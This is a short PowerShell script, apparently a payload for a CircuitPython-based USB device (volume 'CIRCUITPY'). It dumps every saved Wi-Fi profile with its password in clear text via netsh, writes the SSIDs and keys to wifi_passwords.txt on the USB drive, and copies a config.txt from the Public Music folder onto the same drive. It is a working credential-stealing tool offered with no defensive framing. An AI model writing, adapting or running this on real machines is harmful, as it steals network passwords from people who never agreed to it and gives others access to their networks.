# Specify the volume name
$volumeName = "CIRCUITPY"

# Specify the path to look for config.txt
$configFilePath = "C:\Users\Public\Music\config.txt"

# Get the drive letter for the volume with the specified name
$driveLetter = (Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq $volumeName }).DriveLetter

$profiles = netsh wlan show profiles |
            Select-String "All User Profile" |
            ForEach-Object { $_ -replace "    All User Profile     : ", "" } |
            ForEach-Object { $_ -replace "\s+", " " }

$output = ""

$count = 1

foreach ($profile in $profiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear

    $ssid = ($profileDetails | Select-String "SSID name" | ForEach-Object { $_ -replace "SSID name\s+: ", "" }).Trim()
    $key = ($profileDetails | Select-String "Key Content" | ForEach-Object { $_ -replace "Key Content\s+: ", "" }).Trim()

    $ssidString = "ssid$count" + ": ${ssid}"
    $keyString = "key$count" + ": `"$($key)`""

    $output += "$ssidString`n$keyString`n`n"

    $count++
}

$output | Out-File -FilePath "$driveletter\wifi_passwords.txt"

if ($configfilepath){
Copy-Item -Path $configFilePath -Destination "$driveLetter\config.txt" -Force
Write-Host "config.txt copied to $($driveLetter)\config.txt"
}
